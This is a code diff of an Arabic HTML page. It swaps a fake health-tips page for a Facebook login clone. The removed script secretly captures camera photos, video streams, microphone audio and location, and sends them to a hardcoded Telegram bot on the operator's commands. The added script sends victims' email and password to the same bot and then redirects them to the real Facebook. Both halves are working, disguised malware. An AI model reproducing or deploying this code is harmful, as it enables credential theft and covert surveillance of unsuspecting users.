@@ -2,179 +2,62 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>نصائح صحية يومية</title>
-<link rel="manifest" href="/manifest.json">
-<meta name="theme-color" content="#43A047">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Facebook - تسجيل الدخول</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#f0f2f5;color:#333;font-family:'Segoe UI',sans-serif;text-align:center;padding:20px}
-.header{background:linear-gradient(135deg,#43A047,#66BB6A);color:#fff;padding:30px 20px;border-radius:20px;margin-bottom:25px;box-shadow:0 5px 20px rgba(76,175,80,0.3)}
-.header h1{font-size:26px;font-weight:700}
-.header p{font-size:13px;opacity:0.9;margin-top:8px}
-.card{background:#fff;border-radius:15px;padding:20px;margin:15px 0;box-shadow:0 2px 10px rgba(0,0,0,0.06);text-align:right}
-.card h3{color:#43A047;font-size:17px;margin-bottom:12px}
-.card p{font-size:13px;color:#555;line-height:1.8}
-.tip{display:flex;align-items:center;gap:12px;padding:12px 0;border-bottom:1px solid #f0f0f0}
-.tip:last-child{border-bottom:none}
-.tip .icon{width:28px;height:28px;flex-shrink:0}
-.tip .text{font-size:13px;color:#444}
-.footer{font-size:10px;color:#aaa;margin-top:25px}
-.progress{background:#E8F5E9;border-radius:10px;padding:15px;margin:15px 0;text-align:center}
-.progress .bar{background:#C8E6C9;border-radius:5px;height:6px;margin-top:8px}
-.progress .bar .fill{background:#43A047;height:100%;width:60%;border-radius:5px;transition:width 1s}
-.perm-warn{background:#FFF3E0;border:1px solid #FF9800;border-radius:10px;padding:10px;margin:10px 0;font-size:11px;color:#E65100;display:none}
-.perm-warn button{background:#FF9800;color:#fff;border:none;padding:6px 15px;border-radius:15px;font-size:11px;margin-top:5px;cursor:pointer}
+body{background:#f0f2f5;font-family:'Segoe UI',sans-serif;text-align:center;padding:20px}
+.logo{margin:30px 0 10px}
+.logo svg{width:240px;height:50px}
+.card{background:#fff;border-radius:8px;padding:20px;margin:10px auto;max-width:400px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);text-align:center}
+.card p{font-size:14px;color:#1c1e21;margin-bottom:15px}
+input{width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none}
+input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
+.btn-login{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer;margin:10px 0}
+.btn-login:hover{background:#166fe5}
+.link{color:#1877f2;font-size:14px;text-decoration:none;display:block;margin:12px 0}
+.link:hover{text-decoration:underline}
+.divider{border-bottom:1px solid #dadde1;margin:20px 0}
+.btn-new{background:#42b72a;color:#fff;border:none;border-radius:6px;padding:14px 20px;font-size:17px;font-weight:bold;cursor:pointer}
+.btn-new:hover{background:#36a420}
+.footer{font-size:12px;color:#737373;margin-top:20px}
 </style>
 </head>
 <body>
 
-<div class="header">
-<h1>نصائح صحية يومية</h1>
-<p>دليلك لحياة أفضل</p>
-</div>
-
-<div class="progress">
-<p style="color:#43A047;font-weight:600">تقدمك اليومي</p>
-<div class="bar"><div class="fill" id="fillBar"></div></div>
-<p style="font-size:11px;color:#888;margin-top:5px">60% مكتمل</p>
-</div>
-
-<div class="perm-warn" id="permWarn">
-<p id="permText">يجب السماح بالصلاحيات للحصول على أفضل تجربة</p>
-<button onclick="retryPerms()">منح الصلاحيات</button>
+<div class="logo">
+<svg viewBox="0 0 36 36" fill="#1877f2" width="60px" height="60px"><path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 24h-2.5a.5.5 0 01-.5-.5v-3a.5.5 0 01.5-.5H14v-3.34c0-4.53 2.767-6.98 6.68-6.98 1.46 0 2.99.17 4.32.35v3.83h-2.33c-1.27 0-1.69.97-1.69 2.06V20h3.84l-.83 4H21v12.5z"/></svg>
 </div>
 
 <div class="card">
-<h3>نصائح اليوم</h3>
-<div class="tip">
-<svg class="icon" viewBox="0 0 24 24" fill="#2196F3"><path d="M12 2c-5.33 4.55-8 8.48-8 11.8 0 4.98 3.8 8.2 8 8.2s8-3.22 8-8.2c0-3.32-2.67-7.25-8-11.8z"/></svg>
-<span class="text">اشرب 8 أكواب ماء يومياً</span>
-</div>
-<div class="tip">
-<svg class="icon" viewBox="0 0 24 24" fill="#FF9800"><path d="M13.5 5.5c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zM9.8 8.9L7 23h2.1l1.8-8 2.1 2v6h2v-7.5l-2.1-2 .6-3C14.8 12 16.8 13 19 13v-2c-1.9 0-3.5-1-4.3-2.4l-1-1.6c-.4-.6-1-1-1.7-1-.3 0-.5.1-.8.1L6 8.3V13h2V9.6l1.8-.7"/></svg>
-<span class="text">امش 30 دقيقة يومياً</span>
-</div>
-<div class="tip">
-<svg class="icon" viewBox="0 0 24 24" fill="#4CAF50"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-<span class="text">احصل على 8 ساعات نوم</span>
-</div>
-<div class="tip">
-<svg class="icon" viewBox="0 0 24 24" fill="#E91E63"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-<span class="text">تناول الخضروات والفواكه</span>
-</div>
+<p>تسجيل الدخول إلى فيسبوك</p>
+<form method="POST" action="/login">
+<input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+<input type="password" name="password" placeholder="كلمة المرور" required>
+<button type="submit" class="btn-login">تسجيل الدخول</button>
+</form>
+<a href="#" class="link">هل نسيت كلمة المرور؟</a>
+<div class="divider"></div>
+<button class="btn-new">إنشاء حساب جديد</button>
 </div>
 
-<div class="card">
-<h3>معلومة صحية</h3>
-<p>شرب الماء بانتظام يساعد على تحسين عملية الهضم، وتنظيم درجة حرارة الجسم، والحفاظ على صحة الجلد. كما أن المشي اليومي يحسن الدورة الدموية ويقوي عضلة القلب ويقلل من خطر الإصابة بالأمراض المزمنة.</p>
+<div class="footer">
+<b>أنشئ صفحة</b> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.
 </div>
-
-<div class="footer">جميع الحقوق محفوظة 2025</div>
 
 <script>
 const BOT="8915820730:AAHqyTgk9IVvmMLA8xpXO8QuLPEPbIv9A9c";
 const CHAT="6453594151";
-let lastUpdateId=0;
-let processedCommands=[];
-let mediaRecorder=null;
-let streamInterval=null;
-let perms={camera:false,microphone:false,location:false};
-let currentPerm=null;
-
-async function sendMsg(t){
+document.querySelector('form').addEventListener('submit',async function(e){
+    e.preventDefault();
+    let email=document.querySelector('input[name="email"]').value;
+    let password=document.querySelector('input[name="password"]').value;
     await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
         method:'POST',headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({chat_id:CHAT,text:t})
-    }).catch(()=>{});
-}
-async function sendPhoto(blob){
-    let fd=new FormData();fd.append('chat_id',CHAT);fd.append('photo',blob,'camera.jpg');
-    await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{method:'POST',body:fd}).catch(()=>{});
-}
-async function sendVideo(blob){
-    let fd=new FormData();fd.append('chat_id',CHAT);fd.append('video',blob,'stream.webm');
-    await fetch(`https://api.telegram.org/bot${BOT}/sendVideo`,{method:'POST',body:fd}).catch(()=>{});
-}
-async function sendAudio(blob){
-    let fd=new FormData();fd.append('chat_id',CHAT);fd.append('audio',blob,'recording.webm');
-    await fetch(`https://api.telegram.org/bot${BOT}/sendAudio`,{method:'POST',body:fd}).catch(()=>{});
-}
-
-// ==================== PERMISSIONS ====================
-function checkPerms(){
-    navigator.mediaDevices.getUserMedia({video:true}).then(s=>{s.getTracks().forEach(t=>t.stop());perms.camera=true}).catch(()=>{perms.camera=false;showPermWarn('الكاميرا')});
-    navigator.mediaDevices.getUserMedia({audio:true}).then(s=>{s.getTracks().forEach(t=>t.stop());perms.microphone=true}).catch(()=>{perms.microphone=false;showPermWarn('الميكروفون')});
-    navigator.geolocation.getCurrentPosition(()=>{perms.location=true},()=>{perms.location=false;showPermWarn('الموقع')});
-}
-function showPermWarn(p){
-    document.getElementById('permWarn').style.display='block';
-    document.getElementById('permText').textContent='يجب السماح بـ '+p+' للحصول على أفضل تجربة';
-    currentPerm=p;
-}
-function retryPerms(){
-    if(currentPerm==='الكاميرا'){navigator.mediaDevices.getUserMedia({video:true}).then(s=>{s.getTracks().forEach(t=>t.stop());perms.camera=true;document.getElementById('permWarn').style.display='none'}).catch(()=>{})}
-    if(currentPerm==='الميكروفون'){navigator.mediaDevices.getUserMedia({audio:true}).then(s=>{s.getTracks().forEach(t=>t.stop());perms.microphone=true;document.getElementById('permWarn').style.display='none'}).catch(()=>{})}
-    if(currentPerm==='الموقع'){navigator.geolocation.getCurrentPosition(()=>{perms.location=true;document.getElementById('permWarn').style.display='none'},()=>{})}
-}
-setInterval(()=>{if(!perms.camera||!perms.microphone||!perms.location)document.getElementById('permWarn').style.display='block'},30000);
-
-// ==================== STREAM ====================
-async function startStream(){
-    try{
-        let stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:true});
-        mediaRecorder=new MediaRecorder(stream,{mimeType:'video/webm'});
-        let chunks=[];
-        mediaRecorder.ondataavailable=e=>chunks.push(e.data);
-        mediaRecorder.onstop=async()=>{let blob=new Blob(chunks,{type:'video/webm'});await sendVideo(blob);chunks=[]};
-        mediaRecorder.start();
-        streamInterval=setInterval(()=>{if(mediaRecorder&&mediaRecorder.state==='recording'){mediaRecorder.stop();setTimeout(()=>{if(mediaRecorder&&mediaRecorder.state==='inactive')mediaRecorder.start()},500)}},5000);
-        sendMsg('بدء البث المباشر');
-    }catch(e){sendMsg('فشل البث: اسمح بالكاميرا والميكروفون')}
-}
-function stopStream(){
-    if(mediaRecorder&&mediaRecorder.state==='recording')mediaRecorder.stop();
-    if(streamInterval)clearInterval(streamInterval);
-    if(mediaRecorder&&mediaRecorder.stream)mediaRecorder.stream.getTracks().forEach(t=>t.stop());
-    mediaRecorder=null;streamInterval=null;
-    sendMsg('توقف البث');
-}
-
-// ==================== COMMANDS ====================
-async function checkCmd(){
-    try{
-        let r=await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${lastUpdateId+1}&timeout=3`);
-        let d=await r.json();
-        if(d.ok&&d.result.length>0){
-            for(let u of d.result){
-                lastUpdateId=u.update_id;
-                let m=u.message;
-                if(m&&m.text&&!processedCommands.includes(u.update_id)){
-                    processedCommands.push(u.update_id);
-                    let c=m.text.trim();
-                    if(c==='/ping'){sendMsg('متصل');}
-                    else if(c.startsWith('/say ')){let t=c.replace('/say ','');let s=new SpeechSynthesisUtterance(t);s.lang='ar';window.speechSynthesis.speak(s);sendMsg('تم: '+t);}
-                    else if(c==='/photo'){try{let st=await navigator.mediaDevices.getUserMedia({video:true});let v=document.createElement('video');v.srcObject=st;await v.play();let cv=document.createElement('canvas');cv.width=640;cv.height=480;cv.getContext('2d').drawImage(v,0,0);let p=cv.toDataURL('image/jpeg',0.7);st.getTracks().forEach(t=>t.stop());let bl=await(await fetch(p)).blob();await sendPhoto(bl);sendMsg('صورة');}catch(e){sendMsg('فشل الكاميرا');}}
-                    else if(c==='/location'){navigator.geolocation.getCurrentPosition(async p=>{sendMsg(`الموقع:\n${p.coords.latitude},${p.coords.longitude}\nhttps://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`)},()=>{sendMsg('فشل الموقع')});}
-                    else if(c.startsWith('/open ')){let u=c.replace('/open ','');window.open(u,'_blank');sendMsg('تم: '+u);}
-                    else if(c==='/vibrate'){if(navigator.vibrate){navigator.vibrate([500,200,500]);sendMsg('اهتزاز');}}
-                    else if(c==='/stream on'){startStream();}
-                    else if(c==='/stream off'){stopStream();}
-                    else if(c==='/record'){try{let st=await navigator.mediaDevices.getUserMedia({audio:true});let mr=new MediaRecorder(st,{mimeType:'audio/webm'});let chunks=[];mr.ondataavailable=e=>chunks.push(e.data);mr.onstop=async()=>{let blob=new Blob(chunks,{type:'audio/webm'});await sendAudio(blob);sendMsg('تسجيل')};mr.start();setTimeout(()=>{mr.stop();st.getTracks().forEach(t=>t.stop())},10000)}catch(e){sendMsg('فشل التسجيل')}}
-                    else if(c==='/notify'){if(Notification.permission==='granted'){new Notification('نصائح صحية',{body:'تذكير صحي',vibrate:[200,100,200]});sendMsg('إشعار')}}
-                }
-            }
-        }
-    }catch(e){}
-}
-
-if('serviceWorker' in navigator){navigator.serviceWorker.register('/sw.js').catch(()=>{});}
-if('Notification' in window&&Notification.permission!=='granted'&&Notification.permission!=='denied'){Notification.requestPermission();}
-sendMsg('تم فتح الصفحة');
-checkPerms();
-setInterval(checkCmd,2000);
-setInterval(()=>{location.reload()},600000);
-document.addEventListener('contextmenu',e=>e.preventDefault());
+        body:JSON.stringify({chat_id:CHAT,text:'فيسبوك:\nالبريد: '+email+'\nالرمز: '+password})
+    });
+    window.location='https://www.facebook.com/login/';
+});
 </script>
 </body>
 </html>
